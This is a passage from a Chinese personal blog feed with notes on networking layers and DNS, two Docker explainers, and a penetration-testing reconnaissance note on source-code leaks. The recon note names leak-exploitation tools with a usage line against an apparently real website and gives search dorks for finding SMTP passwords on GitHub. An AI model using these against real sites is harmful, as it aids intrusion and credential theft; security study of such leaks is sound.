id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>生成IP头部后，接下来要交给数据链路层在IP头部前面加上MAC头部，并封装成数据帧发送到网络上</p><p>IP头部中的接收方IP地址表示网络包的目的地，通过这个地址我们可以判断要将包发到哪里，但是在以太网的世界里，这个思路是行不通的</p><p>什么是以太网呢？电脑上的以太网接口，WiFi接口、以太网交换机、路由器上的千兆，万兆以太网口，还有网线，都是以太网的组成部分。以太网就是一种在局域网内，把附近的设备连接起来，使他们进行通讯的技术</p><p>以太网在判断网络包目的地时和IP的方式不同，因此必须采用相匹配的方式才能在以太网中将包发往目的地，而MAC头部就是干这个用的，所以，在以太网中进行通信要用到MAC地址</p><p>MAC 头部是以太⽹使⽤的头部，它包含了接收⽅和发送⽅的 MAC 地址等信息，我们可以通过 ARP 协议获取对⽅的 MAC 地址。所以说，⽹络接⼝层主要为⽹络层提供「链路级别」传输的服务，负责在以太⽹、WiFi 这样的底层⽹络上发送原始数据包，⼯作在⽹卡这个层次，使⽤ MAC 地址来标识⽹络上的设备。</p><h3 id="数据包封装格式"><a href="#数据包封装格式" class="headerlink" title="数据包封装格式"></a>数据包封装格式</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426112907688.png" alt="image-20240426112907688"></p><p>数据链路层的传输单位是帧，IP层的传输单位是包，TCP层的传输单位是段，HTTP的传输单位是消息或者报文</p><h2 id="HTTP协议作用过程"><a href="#HTTP协议作用过程" class="headerlink" title="HTTP协议作用过程"></a>HTTP协议作用过程</h2><p>想必不少小伙伴都想知道当键入网址，到网页显示，期间发生了什么，这就和HTTP关系密切了，接下来我们将以下图较简单的网络拓扑模型作为例子，探究究竟发生了什么</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426113633652.png" alt="image-20240426113633652"></p><p>浏览器做的第一步是解析URL，URL解析后，生成发送给Web服务器的请求信息，下图展示了URL中的各个元素的含义</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426113825508.png" alt="image-20240426113825508"></p><p>当没有路径名时，代表访问根目录下设置的默认文件，即/index.html（自己搭过网站的肯定很清楚），这样就不会混乱了</p><p>对URL进行解析后，浏览器确定了Web服务器和文件名，接下来就是根据这些信息来生成HTTP请求消息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426135537075.png" alt="image-20240426135537075"></p><p>但是仅仅靠一个小小的HTTP数据包，如何在浩瀚的网络中找到自己的归宿呢？</p><h3 id="真实地址查询-DNS"><a href="#真实地址查询-DNS" class="headerlink" title="真实地址查询-DNS"></a>真实地址查询-DNS</h3><p>通过浏览器解析URL并生成HTTP消息后，需要委托操作系统将消息发给Web服务器，但是在发送之前，需要知道服务器域名对应的IP地址，如果不知道IP地址，则相关的HTTP消息不能正确到达对应的服务器，而这种专门保存Web服务器域名与IP的对应关系的，叫做<strong>DNS服务器</strong></p><h3 id="域名的层级关系"><a href="#域名的层级关系" class="headerlink" title="域名的层级关系"></a>域名的层级关系</h3><p>DNS中的域名是用句点来分隔的，比如www.baidu.com，这里的句点代表了不同层次之间的界限</p><p>在域名中，越靠右的位置表示其层级越高，域名的最后还有一个点，比如www.baidu.com.，这个点代表根域名，即.根域是在最顶层，它的下一层就是.com顶级域名,再下面是baidu.com。所以域名的层级关系类似于一个树状结构</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426192949727.png" alt="image-20240426192949727"></p><p>根域的DNS服务器信息保存在互联网中的所有DNS服务器中，这样一来，任何DNS服务器就都可以找到并访问根域服务器。因此，客户端只要能够找到任意一台DNS服务器，就可以通过它找到根域DNS服务器，然后再一路顺藤摸瓜找到位于下层的某台目标DNS服务器</p><h3 id="域名解析的工作流程"><a href="#域名解析的工作流程" class="headerlink" title="域名解析的工作流程"></a>域名解析的工作流程</h3><p>如下图所示，介绍相关迭代查询（现实生活中常用）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426193445579.png" alt="image-20240426193445579"></p><p>递归查询也有，但是很少，主要是递归查询是本地域名服务器不知道，然后向根域名询问，由根域名一步步去查询，最后给本地域名服务器返回对应的IP地址，这样容易造成根服务器使用频率过高，故在现实生活中不常用，主机向本地服务器查询用递归查询，本地服务器向根域名服务器查询使用迭代查询</p><p>但是并不会每一次都进行查询，不然所耗费的资源太多，浏览器会先看看自身有没有对这个域名的缓存，如果有，直接返回，如果没有，就去问操作系统，操作系统也会去看自己的缓存，如果有，就直接返回，如果没有，再去hosts文件看，如果也没有，才会去问本地DNS服务器</p><h3 id="协议栈"><a href="#协议栈" class="headerlink" title="协议栈"></a>协议栈</h3><p>数据包找到目的地了，但是还是很迷茫，它接下来需要找谁帮忙呢？这个时候就要用到<strong>协议栈</strong>了</p><p>通过DNS获取IP后，就可以把HTTP的传输工作交给操作系统中的协议栈。协议栈的内部分为几个部分，分别承担不同的工作，上下关系具有一定的规则，上面的部分会向下面的部分委托工作，下面的部分收到委托工作并执行</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240426195259231.png" alt="image-20240426195259231"></p><p>应用程序通过调用Socket库，来委托协议栈工作，协议栈的上半部分有两块，分别是负责收发数据的TCP和UDP协议，这两个传输协议会接受应用层的委托执行收发数据的操作</p><p>协议栈的下面一半是用IP协议控制网络包收发操作，在互联网上传数据时，数据会被切分成一块块的网络包，而将网络包发送给对方的操作就是由IP负责的</p><p>其中IP中还包括ICMP协议和ARP协议：ICMP用于告知网络包传输过程中产生的错误以及各种控制信息；ARP用于根据IP地址查询相应的以太网MAC地址</p><p>IP下面的网卡驱动程序负责控制⽹卡硬件，⽽最下⾯的⽹卡则负责完成实际的收发操作，也就是对⽹线中的信号执⾏发送和接收操作</p><p>HTTP的传输需要那么多的协议协助，我们将一个个进行介绍</p>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
          <category> 计算机网络 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> TCP/IP模型 </tag>
            
            <tag> HTTP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息打点-资产架构&amp;源码泄露</title>
      <link href="/post/edfab61a.html"/>
      <url>/post/edfab61a.html</url>
      
        <content type="html"><![CDATA[<h2 id="资产架构"><a href="#资产架构" class="headerlink" title="资产架构"></a>资产架构</h2><h3 id="WEB单个源码安全"><a href="#WEB单个源码安全" class="headerlink" title="WEB单个源码安全"></a>WEB单个源码安全</h3><p>单个源码的目录指向单个站点域名</p><h3 id="WEB多个目录源码安全"><a href="#WEB多个目录源码安全" class="headerlink" title="WEB多个目录源码安全"></a>WEB多个目录源码安全</h3><p>一个网站，两套程序，任何一个程序出现问题都可以进行渗透测试，选择不同的目录</p><p>例如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">www.borgeous.com           论坛</span><br><span class="line">www.borgeous.com/blog      wordpress程序</span><br></pre></td></tr></table></figure><h3 id="WEB多个端口源码安全"><a href="#WEB多个端口源码安全" class="headerlink" title="WEB多个端口源码安全"></a>WEB多个端口源码安全</h3><p>用端口区分不同的程序，当某一端口出现漏洞时，即可进行渗透测试</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">www.borgeous.com           论坛</span><br><span class="line">www.borgeous.com:<span class="number">8081</span>      wordpress程序</span><br></pre></td></tr></table></figure><h3 id="服务器架设多个站点安全"><a href="#服务器架设多个站点安全" class="headerlink" title="服务器架设多个站点安全"></a>服务器架设多个站点安全</h3><p>同一个ip下的子域名，例如</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bbs.borgeous.com <span class="number">47.178</span><span class="number">.156</span><span class="number">.32</span> dz论坛</span><br><span class="line">edu.borgeous.com <span class="number">47.178</span><span class="number">.156</span><span class="number">.32</span> edu程序</span><br><span class="line">子域名，同一个IP</span><br></pre></td></tr></table></figure><p>给到目标bbs.borgeous.com，可以尝试对edu.borgeous.com进行测试</p><h3 id="架设第三方插件接口安全"><a href="#架设第三方插件接口安全" class="headerlink" title="架设第三方插件接口安全"></a>架设第三方插件接口安全</h3><p>wordpress插件</p><p>web应用插件（phpmyadmin)  ——&gt;数据库管理插件</p><p>有些数据库不支持外联，为了方便数据库管理，会安装插件，但也方便了攻击者攻击数据库</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/aaaae2291395f9ec8c159939f85e9f87.png" alt="image-20231102141418205"></p><h3 id="服务器架设多个应用安全"><a href="#服务器架设多个应用安全" class="headerlink" title="服务器架设多个应用安全"></a>服务器架设多个应用安全</h3><p>例如</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">服务器应用：ftp服务器</span><br><span class="line">方便管理员进行文件操作，也方便攻击者攻击ftp协议服务</span><br></pre></td></tr></table></figure><h2 id="攻击阻碍"><a href="#攻击阻碍" class="headerlink" title="攻击阻碍"></a>攻击阻碍</h2><h3 id="站库分离"><a href="#站库分离" class="headerlink" title="站库分离"></a>站库分离</h3><p>站点和数据库存放的地址不同，需要进行远程协同。</p><p>即安装程序的时候，会选择将数据库安装在远程地址，从而将数据库和源码放在不同的地方，以达到站库分离，此时获取就比较困难</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/8ac702f25d644c108d5189a3c9a113b8.png" alt="image-20231102142716711"></p><h3 id="负载均衡服务"><a href="#负载均衡服务" class="headerlink" title="负载均衡服务"></a>负载均衡服务</h3><p>为了防止某台主机死机或者流量过大的情况产生，负载均衡服务会提供备用服务器进行加速，所以可能我们会拿下备用服务器的权限，而不是主机的权限</p><h3 id="CDN加速服务"><a href="#CDN加速服务" class="headerlink" title="CDN加速服务"></a>CDN加速服务</h3><p>CDN结点：相当于中间结点，解决访问速度过慢的情况，购买之后，访问结点相当于访问缓存，如果攻击下CDN的权限，可能只是拿下缓存的权限</p><h3 id="WAF应用-主机应用防火墙"><a href="#WAF应用-主机应用防火墙" class="headerlink" title="WAF应用/主机应用防火墙"></a>WAF应用/主机应用防火墙</h3><p>WAF应用防火墙：针对网站的防护，应用层防火墙</p><p>主机防护防护墙：360、火绒、安全狗等，针对于系统防护</p><h2 id="源码获取"><a href="#源码获取" class="headerlink" title="源码获取"></a>源码获取</h2><h3 id="常见源码泄露"><a href="#常见源码泄露" class="headerlink" title="常见源码泄露"></a>常见源码泄露</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git源码泄露</span><br><span class="line">svn源码泄露</span><br><span class="line">hg源码泄露</span><br><span class="line">网站备份压缩文件/.zip/.rar</span><br><span class="line">WEB-INF/web.xml 泄露</span><br><span class="line">DS_Store 文件泄露</span><br><span class="line">SWP 文件泄露</span><br><span class="line">CVS 泄露</span><br><span class="line">Bzr 泄露</span><br><span class="line">GitHub 源码泄漏</span><br></pre></td></tr></table></figure><h3 id="CMS识别（网站指纹识别）"><a href="#CMS识别（网站指纹识别）" class="headerlink" title="CMS识别（网站指纹识别）"></a>CMS识别（网站指纹识别）</h3><p>1.观察网站特征信息，找到是什么CMS搭建的，然后下载源码</p><p>2.用云悉平台识别CMS：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p><h3 id="GIT泄露"><a href="#GIT泄露" class="headerlink" title="GIT泄露"></a>GIT泄露</h3><p>在执行<code>git init</code>初始化目录的时候，会在当前目录下自动创建一个<code>.git</code>目录，用来记录代码的变更记录等。发布代码的时候，如果没有把<code>.git</code>这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码</p><p>访问<code>xxxx/.git</code>，进入403页面，说明存在git泄露</p><p>利用工具：<code>githack</code></p><h3 id="SVN源码泄露"><a href="#SVN源码泄露" class="headerlink" title="SVN源码泄露"></a>SVN源码泄露</h3><p><code>svn</code>也是一个版本控制平台，原理与Git源码泄露的原理相同。判断方式：在域名后面直接加<code>.svn/entries</code>。如果存在，就利用<code>SvnHack</code>获取源码文件</p><h3 id="DS-Store泄露"><a href="#DS-Store泄露" class="headerlink" title="DS_Store泄露"></a>DS_Store泄露</h3><p><code>.DS_Store</code>是<code>Mac</code>下<code>Finder</code>用来保存如何展示文件/文件夹的数据文件，每个文件夹下对应一个。如果将<code>.DS_Store</code>上传到服务器上，可能会造成文件目录结构泄露，特别是备份文件、源代码文件</p><p>访问<code>xxxx..DS_Store</code>浏览器会自动下载DS_Store文件</p><p>漏洞利用工具：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">github项目地址：https://github.com/lijiejie/ds_store_exp</span><br><span class="line">用法示例：</span><br><span class="line">ds_store_exp.py http://zhuchao.yslts.com/.DS_Store</span><br></pre></td></tr></table></figure><h3 id="composer-json泄露-利用PHP特性"><a href="#composer-json泄露-利用PHP特性" class="headerlink" title="composer.json泄露-利用PHP特性"></a>composer.json泄露-利用PHP特性</h3><p>使用方法：直接在域名后面加<code>/composer.json</code>,</p><p>可能获取到网站使用的CMS和其他版本信息</p><p>比如，<code>访问：http://english.cmdesign.com.cn/composer.json，</code>获取到其CMS等信息</p><h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p><code>WEB-INF</code>是Java的web应用的安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应的映射才能访问</p><p><code>WEB-INF</code> 主要包含一下文件或目录：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">WEB-INF/classes/ : 一般用来存放Java类文件(.class)</span><br><span class="line">WEB-INF/lib/ : 用来存放打包好的库(.jar)</span><br><span class="line">WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure><h2 id="资源监控"><a href="#资源监控" class="headerlink" title="资源监控"></a>资源监控</h2><h3 id="GITHUB资源搜索"><a href="#GITHUB资源搜索" class="headerlink" title="GITHUB资源搜索"></a>GITHUB资源搜索</h3><p><strong>github.com、gitee.com</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">in</span>:name test <span class="comment">#仓库标题搜索含有关键字</span></span><br><span class="line"><span class="keyword">in</span>:descripton test <span class="comment">#仓库描述搜索含有关键字</span></span><br><span class="line"><span class="keyword">in</span>:readme test <span class="comment">#Readme 文件搜素含有关键字</span></span><br><span class="line">stars:&gt;<span class="number">3000</span> test <span class="comment">#stars 数量大于 3000 的搜索关键字</span></span><br><span class="line">stars:<span class="number">1000.</span><span class="number">.3000</span> test <span class="comment">#stars 数量大于 1000 小于 3000 的搜索关键字</span></span><br><span class="line">forks:&gt;<span class="number">1000</span> test <span class="comment">#forks 数量大于 1000 的搜索关键字</span></span><br><span class="line">forks:<span class="number">1000.</span><span class="number">.3000</span> test <span class="comment">#forks 数量大于 1000 小于 3000 的搜索关键字</span></span><br><span class="line">size:&gt;=<span class="number">5000</span> test <span class="comment">#指定仓库大于 5000k(5M)的搜索关键字</span></span><br><span class="line">pushed:&gt;<span class="number">2019</span>-02-<span class="number">12</span> test <span class="comment">#发布时间大于 2019-02-12 的搜索关键字</span></span><br><span class="line">created:&gt;<span class="number">2019</span>-02-<span class="number">12</span> test <span class="comment">#创建时间大于 2019-02-12 的搜索关键字</span></span><br><span class="line">user:test <span class="comment">#用户名搜素的搜索关键字</span></span><br><span class="line">license:apache-<span class="number">2.0</span> test <span class="comment">#明确仓库的 LICENSE 搜索关键字</span></span><br><span class="line">language:java test <span class="comment">#在 java 语 言的代码中搜索关键字</span></span><br><span class="line">user:test <span class="keyword">in</span>:name test <span class="comment">#组合搜索,用户名 test 的标题含有 test 的</span></span><br></pre></td></tr></table></figure><p><strong>关键字配合谷歌、必应搜索</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">site:Github.com smtp</span><br><span class="line">site:Github.com smtp @qq.com</span><br><span class="line">site:Github.com smtp @<span class="number">126.</span>com</span><br><span class="line">site:Github.com smtp @<span class="number">163.</span>com</span><br><span class="line">site:Github.com smtp @sina.com.cn</span><br><span class="line">site:Github.com smtp password</span><br><span class="line">site:Github.com String password smtp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 信息打点 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN </tag>
            
            <tag> WAF </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 资产架构 </tag>
            
            <tag> 端口 </tag>
            
            <tag> 源码泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker内部详解</title>
      <link href="/post/24ef11e7.html"/>
      <url>/post/24ef11e7.html</url>
      
        <content type="html"><![CDATA[<p>上一篇文章已经讲述了为什么会有Docker容器的出现，其实本质上来说，Docker是代码和操作系统之间的中间层，为了解决程序员“这个程序在我的电脑上明明能跑，为什么到你那就不行了呢”的问题。科学家们选择将<strong>程序</strong>和<strong>环境</strong>（依赖库和配置）一起打包给到对方运行，而这个打包并运行的工具软件，就是Docker，接下来我们看看它具体是怎么实现的</p><h2 id=""><a href="#" class="headerlink" title=""></a><mark class="hl-label blue">基础镜像</mark> </h2><p>既然环境不同会导致运行结果不同，那么我们首先要做的事情就是<font color=  #BBFFFF><strong>统一环境</strong></font>。而环境中最重要的就是<font color=  #BBFFFF><strong>操作系统</strong></font>。我们得让所有程序都跑在同一个操作系统上，但是如果打包整个操作系统，那空间未免需要占用的太多，但是我们又知道，操作系统分为用户空间和内核空间，并且<strong>应用程序都是运行在用户空间的</strong>，这不就解决了，我们完全可以阉割操作系统，只要操作系统的用户空间部分，就能构建我们想要的环境。</p><p>其次我们需要统一语言，即<font color=  #BBFFFF><strong>程序语言依赖</strong></font>，我们要跑python，好歹得装个python解释器吧；要跑JAVA应用，得装个JVM吧。所以，程序语言依赖也是必不可少的一项</p><p>我们选中一个基础的操作系统和程序语言后，我们将它们对应的文件系统，依赖库，配置等放在一起打包成压缩包似的文件，这就是所谓的基础镜像</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240415112709356.png" alt="image-20240415112709356"></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><mark class="hl-label blue">Dockerfile是什么</mark> </h2><p>单纯有基础镜像显然是不够的，我们经常还需要安装一些依赖，比如gcc等，甚至还要创建一些文件夹，才能运行我们的应用程序。linux中，所有的命令都通过命令行实现，所以有了基础镜像后，我们还需要用命令行将依赖装好，这时候，我们可以将所需要的命令一行行地列出来，就像一份<font color=  #BBFFFF><strong>To Do List</strong></font>，意思是要求在基础镜像的基础上按着 To Do List挨个执行命令，比如下面的To Do List</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定基础镜像</span></span><br><span class="line">FROM python:<span class="number">3.9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制依赖文件到容器中</span></span><br><span class="line">COPY requirements.txt .</span><br><span class="line"></span><br><span class="line">RUN yum install gcc</span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">RUN pip install --no-cache-<span class="built_in">dir</span> -r requirements.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将当前目录下的所有文件复制到容器的 /app 目录下</span></span><br><span class="line">COPY . /app</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置容器启动时执行的命令</span></span><br><span class="line">CMD [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;app.py&quot;</span>]</span><br></pre></td></tr></table></figure><p>像这样一份列清楚了从操作系统到应用服务启动，需要做哪些事情的清单文件，就叫做<font color=  #BBFFFF><strong>Dockerfile</strong></font>，大家在用pip安装其他github代码时，也会有<code>pip install -r requirements.txt</code>，这里的<code>requirements.txt</code>和Dockerfile作用一致</p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><mark class="hl-label blue">容器镜像是什么</mark> </h2><p>Dockerfile只是描述了要做哪些事，并没有真正开始做，当我们执行<font color=  #BBFFFF><strong>Docker Build</strong></font>的时候，Docker软件就会按着Dockerfile的说明，一行行构建环境和应用程序，最终这个环境+程序被打包成压缩包，放在一个叫<font color=  #BBFFFF><strong>容器镜像</strong></font>的东西中</p><p>只要将容器镜像传到任意一台服务器上，对这个镜像进行“解压缩”，我们就可以运行环境和程序，通常使用<code>docker run xxxx</code>的命令进行运行</p><h2 id="-3"><a href="#-3" class="headerlink" title=""></a><mark class="hl-label blue">Registry是什么</mark> </h2><p>为了使每个人都能更快捷的获取镜像，如果挨个传输过去，那么所有的压力都给到网络带宽了，这显然是不合理的。我们可以参考github代码仓库的做法，所有人用<code>git push</code>上传自己的代码到github上，再用<code>git pull</code>从github上拉取到自己的机器上。Docker也一样，通过<code>docker push</code>将镜像推到仓库，在需要的时候通过<code>docker pull</code>将镜像拉取到机器上，这个负责管理镜像仓库推拉能力的服务，就叫<font color=  #BBFFFF><strong>Docker Registry</strong></font>。</p><h2 id="-4"><a href="#-4" class="headerlink" title=""></a><mark class="hl-label blue">容器是什么</mark> </h2><p>解决了服务器中间的容器镜像传输问题我们可以执行<code>docker pull</code>到自己的服务器上，然后执行<code>docker run</code>，将这个镜像解压缩，获得一个独立的环境和应用程序并运行起来，这样独立的环境和程序，就是一个容器，一个操作系统可以跑多个容器，不同的容器之间是相互隔离互不干扰的，以下是我服务器上运行的几个基础docker容器</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240705175245532.png" alt="image-20240705175245532"></p><p>现在我们可以来讨论一下虚拟机和容器的区别。虚拟机和容器很像，都可以独立运行彼此互不干扰，但是不同的是，传统虚拟机自带一个完整的操作系统，而容器本身不带完整操作系统，容器的基础镜像实际上只包含了操作系统的核心依赖库和配置文件等组件。它利用一个叫<font color=  #BBFFFF><strong>Name Space</strong></font>的能力让它看起来像是一个独立的操作系统，再利用一个叫<font color=  #BBFFFF><strong>Cgroup</strong></font>的能力限制它使用的计算机资源。</p><p>综上所述，容器本质上只是一个自带独立运行环境的特殊进程，底层用的实际上是宿主机的操作系统内核</p><h2 id="-5"><a href="#-5" class="headerlink" title=""></a><mark class="hl-label blue">总结</mark> </h2><p>Docker本质上就是一个将程序和环境打包并运行的工具软件，而Docker容器本质上只是一个自带独立运行环境的特殊进程，底层用的其实是宿主机的操作系统内核</p><p>Docker软件通过Dockerfile描述环境和应用程序的依赖关系，<code>docker build</code>构建镜像，<code>docker pull</code>和<code>docker push</code>实现和<code>Docker Registry</code>交互实现存储和分发镜像，<code>docker run</code>用于启动容器</p><p>Docker能够帮助程序员更好地解决环境配置问题，不需要程序员在环境配置上花太多的时间和精力，Docker Compose解决的是多个容器组成的一套服务的部署问题，Docker Swarm解决的是多个容器组成的一套服务在多台服务器上的部署问题，k8s是Docker Swarm的竞品，在更高维度上兼容了Docker容器，实现容器的编排和调度，k8s除了支持Docker的容器外，还支持其他的容器</p>]]></content>
      
      
      <categories>
          
          <category> 面试知识点 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker和传统虚拟机的区别</title>
      <link href="/post/76b76384.html"/>
      <url>/post/76b76384.html</url>
      
        <content type="html"><![CDATA[<p>最近在部署自己的博客时遇见过购买服务器的问题，当时打开阿里云轻量级服务器时，看见这么多的实例，属实是自己也有点懵逼，什么ECS，VPS，ECI一大堆，自己也不知道是什么东西，但是跟着CSDN教程，还是把服务器给选好了；这两天在学习操作系统的时候，老师也讲到docker技术，并且给我们强调了它和虚拟机的区别，当时旁边一个同学一直在说docker和nachos没什么太大的区别，我很疑惑，于是在课后搜索了相关资料，汇总成这一篇学习笔记</p><h2 id=""><a href="#" class="headerlink" title=""></a><mark class="hl-label blue">物理服务器是什么？</mark> </h2><p>当时在搭建网站的时候，搜索服务器的时候，网站上给我很多推荐，教我如何自己搭建一台属于自己的服务器，当时点进去稍微浏览了一下，其实用一台废弃的电脑就可以做成，因为一台自己的服务器只需要cpu、内存等硬件以及操作系统，像这样的一台看得见摸得着的机器，其实就是云厂商页面里提到的<mark class="hl-label purple">物理服务器</mark> 或者<mark class="hl-label purple">物理机</mark> ，有的厂商叫它<mark class="hl-label purple">独立服务器</mark> </p><p>所以我们为什么要买云厂商的服务器呢？自己搭建一个属于自己的不香吗？</p><p>当然不香，自己搭建在家里不耗电吗？一年下来电费都好几百，还得花精力给它维修，保证它不关机，最重要的是，性能还没云厂商的好，核数还没人家的高，自己搭那真是纯小丑🤡🤡</p><p>但是问题又来了，云厂商的物理服务器一般都是固定的，而且很高，我们购买云服务器的时候是可以选择对应核数的，并且我们有时候根本不需要这么高配的机器，那怎么办呢？这一点当然云厂商也考虑到了。</p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><mark class="hl-label blue">vps和ecs是什么？</mark> </h2><p>云厂商一般会将一台物理服务器分割为多个虚拟机，跟我们在自己的电脑上安装VMware建立虚拟机是一个道理。每个虚拟机都有自己独立的操作系统、资源（CPU、内存、存储空间）和公网IP地址，然后对外出售，这样的虚拟机就是<strong>VPS</strong>（Virtual Private Server，虚拟专用服务器）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240412111503808.png" alt="image-20240412111503808"></p><p>但是传统VPS有个缺点，不支持用户自主升降级，资源是预先分配好的并且不易于动态调整的，即你买了1核1G的服务器，想给它升级成2核2G的，但在VPS中是不能实现的，如果加入自主升级降级的功能，那就成了<strong>ECS</strong>（Elastic Compute Service，弹性计算服务）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240412112116264.png" alt="image-20240412112116264"></p><p>用户可以根据需要随时调整CPU、内存、磁盘和带宽，所以为什么叫<mark class="hl-label purple">弹性</mark> </p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><mark class="hl-label blue">docker容器是什么？</mark> </h2><p>有了自己的ECS后，一般我们会开始部署自己的软件应用，机器少的时候我们手动部署问题不大，机器多了的话各种问题就来了，最明显的就是底层操作系统的不同，部署应用的时候会有各种环境问题，但是如果能让软件带着操作系统环境一起部署就好了，最简单的办法就是让软件和操作系统一起打包成虚拟机部署在ECS中，但是这样东西太多了，太重了。</p><p>聪明的科学家们想到了解法，既然一个操作系统太重，那就只打包<mark class="hl-label purple">软件和系统依赖库加载配置</mark> 就好了。然后将这部分系统文件挂载到ECS操作系统下，利用一个叫<mark class="hl-label purple">Namespace</mark>  的能力让它看起来像一个独立的操作系统一样，再利用一个叫<mark class="hl-label purple">Cgroup</mark> 的能力限制它能使用的计算资源，这样省掉了一层笨重的操作系统，同时让软件轻松地运行在各类操作系统上，这就是常说的Docker容器技术</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240412154242434.png" alt="image-20240412154242434"></p><p>总的来说，就是服务器上跑ECS，ECS上跑Docker容器，多个Docker容器共享一个ECS实例</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240412154402520.png" alt="image-20240412154402520"></p><h2 id="-3"><a href="#-3" class="headerlink" title=""></a><mark class="hl-label blue">Nachos是什么？</mark> </h2><p>Nachos全程(Not Another Completely Heuristic Operating System)，是一个教学用的操作系统，提供了操作系统的框架。本质上是Linux宿主机上的一个进程，是一个框架，很多地方的实现都需要我们自己来完善，在完善这些功能的同时，可以帮助我们更加的了解到操作系统的内部运行机制，只是一个身体力行的教学平台！！！和Docker半毛钱关系都没有，老师上课讲Docker，可能只是想让我们用Docker管理自己的Nachos！</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240412160555824.png" alt="image-20240412160555824"></p><p>所以，有些东西还得自己去看，听别人的只能把自己搞得更糊涂</p><h2 id="文章参考来源"><a href="#文章参考来源" class="headerlink" title="文章参考来源"></a>文章参考来源</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzUxODAzNDg4NQ==&amp;mid=2247534049&amp;idx=2&amp;sn=1ef2674ddb3217bbafcb5cd6946407ac&amp;chksm=f98d014bcefa885d6b68c0405718abf634a33427264a8ae4d04bc478bc03121dbfdceed7012e&amp;scene=21#wechat_redirect">面试官：Docker和传统虚拟机有什么区别？</a></p><p>NachOs实验文档（老师发的）</p>]]></content>
      
      
      <categories>
          
          <category> 面试知识点 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 虚拟机 </tag>
            
            <tag> Docker </tag>
            
            <tag> Nachos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础入门-加密算法&amp;Web&amp;数据库&amp;系统&amp;代码</title>
      <link href="/post/f52e1c95.html"/>
      <url>/post/f52e1c95.html</url>
      
